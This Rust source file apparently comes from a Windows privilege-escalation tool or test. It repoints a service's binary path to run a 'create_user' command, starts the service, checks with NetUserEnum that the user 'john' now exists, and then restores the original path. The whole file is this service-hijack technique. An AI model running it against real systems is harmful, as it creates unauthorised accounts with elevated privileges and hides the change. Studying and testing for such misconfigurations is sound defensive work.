use crate::winapi::service::{get_service_handle, set_service_binary_path, Service};
#[allow(unused_imports)]
use windows::Win32::System::Services::{
    ChangeServiceConfigA, StartServiceA, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
    SERVICE_WIN32_OWN_PROCESS,
};

use windows::Win32::NetworkManagement::NetManagement::{
    NetUserEnum, MAX_PREFERRED_LENGTH, NET_USER_ENUM_FILTER_FLAGS, USER_INFO_0,
};

#[allow(dead_code)]
pub fn run(in_service: &Service) -> () {
    let binary_path_name: String = "C:\\Users\\Administrator\\ccli.exe create_user".to_owned();

    unsafe {
        log::info!("binary_path_name: {:?}", binary_path_name);
        let _ = set_service_binary_path(&in_service, binary_path_name);

        let _handle_privs = 0x10; // start/stop service
        let _service_handle = get_service_handle(&in_service, _handle_privs).unwrap();
        log::info!("StartServiceA");
        let _result = StartServiceA(_service_handle, None);
        log::info!("StartServiceA result: {:?}", _result);

        let level = 0;
        let filter = 0;
        let mut bufptr = std::ptr::null_mut();
        let prefmaxlen = MAX_PREFERRED_LENGTH;
        let mut entriesread = 0;
        let mut totalentries = 0;

        log::info!("NetUserEnum");
        let _result = NetUserEnum(
            None,
            level,
            NET_USER_ENUM_FILTER_FLAGS(filter),
            &mut bufptr,
            prefmaxlen,
            &mut entriesread,
            &mut totalentries,
            None,
        );
        log::info!("NetUserEnum result: {:?}", _result);

        for i in 0..entriesread {
            let user = *((bufptr as *mut USER_INFO_0).add(i as usize));
            log::info!("user_name: {:?}", user.usri0_name.to_string());
            if user.usri0_name.to_string().unwrap_or("".to_owned()) == "john".to_owned() {
                log::info!("successfully created user");
            }
        }

        log::info!("reset binary_path_name");
        let _ = set_service_binary_path(&in_service, in_service.path_name.clone());
    }
}
